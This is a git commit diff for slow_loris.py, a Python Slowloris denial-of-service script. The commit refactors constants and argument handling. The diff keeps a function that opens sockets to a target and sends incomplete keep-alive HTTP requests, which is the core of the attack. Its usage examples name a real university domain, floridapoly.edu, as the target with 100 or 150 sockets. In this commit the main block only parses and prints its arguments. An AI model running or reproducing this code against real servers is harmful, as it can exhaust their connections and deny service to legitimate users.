03149e917ae676dd9bdefd2c3aab240b9a350347
Elijah Luckey <luckeyelijah112@gmail.com>
2020-11-03 12:17:08 -0500

    assigning arguments

--- slow_loris.py
+++ slow_loris.py
@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import socket
 import random
 import sys
@@ -8,9 +10,15 @@ headers = [
     "Connection: keep-alive"
 ]
 
+tests = []
+
 # Used in formating the requests
-base_request = "GET /?{} HTTP/1.1\r\n"
-preceding_request = '{}\r\n'
+BASE_REQUEST = "GET /?{} HTTP/1.1\r\n"
+PRECEDING_REQUEST = '{}\r\n'
+
+# Exit codes
+SUCCESS = 0
+FAILURE = 1
 
 
 def gen_socket(ip, https=True) -> socket:
@@ -26,26 +34,58 @@ def gen_socket(ip, https=True) -> socket:
     s.connect((ip, port))
 
     int: rand_int = random.randint(0, 2000)
-    request = base_request.format(rand_int).encode('UTF-8')
+    request = BASE_REQUEST.format(rand_int).encode('UTF-8')
     s.send(request)
 
     for header in headers:
-        r = preceding_request.format(header).encode('UTF-8')
+        r = PRECEDING_REQUEST.format(header).encode('UTF-8')
         s.send(r)
 
     return s
 
 
+def check_and_assign_args(arg_ip, arg_port_type, arg_num_sockets, arg_time):
+
+    # TODO: Work on assertions
+
+    # if(type(int(arg_num_sockets)) is not (int)):
+    #     print("Number of sockets:", arg_num_sockets, "is not an int")
+    #     exit(FAILURE)
+
+    # if(type((arg_time)) is not (int)):
+    #     print("Time:", arg_time, "is not an int")
+    #     exit(FAILURE)
+
+    ip = arg_ip
+    is_https = False
+
+    if (str(arg_port_type) == "https"):
+        is_https = True
+
+    num_sockets = int(arg_num_sockets)
+    time = int(arg_time)
+
+    return ip, is_https, num_sockets, time
+
+
 if __name__ == "__main__":
+
     if len(sys.argv) < 5:
         # Invalid use prints usage
         print(
-            "Usage:\tpython {} <website/ip> <http or https> <# of sockets> <timeout>\n".format(sys.argv[0]))
-        print("Ex.:\t{} floridapoly.edu http 100 10".format(sys.argv[0]))
-        print("\t{} floridapoly.edu https 150 5".format(sys.argv[0]))
-        exit(1)
+            "Usage\t| python {} <website/ip> <http or https> <# of sockets> <timeout>\n".format(sys.argv[0]))
+        print("Example\t| python {} floridapoly.edu http 100 10".format(
+            sys.argv[0]))
+        print("\t| python {} floridapoly.edu https 150 5".format(sys.argv[0]))
+        exit(FAILURE)
 
-    ip = sys.argv[1]
-    port_type = sys.argv[2]
-    num_sockets = int(sys.argv[3])
-    time = int(sys.argv[4])
+    ip, is_https, num_sockets, time = check_and_assign_args(
+        sys.argv[1],
+        sys.argv[2],
+        sys.argv[3],
+        sys.argv[4],
+    )
+
+    print(ip, is_https, num_sockets, time)
+
+    exit(SUCCESS)
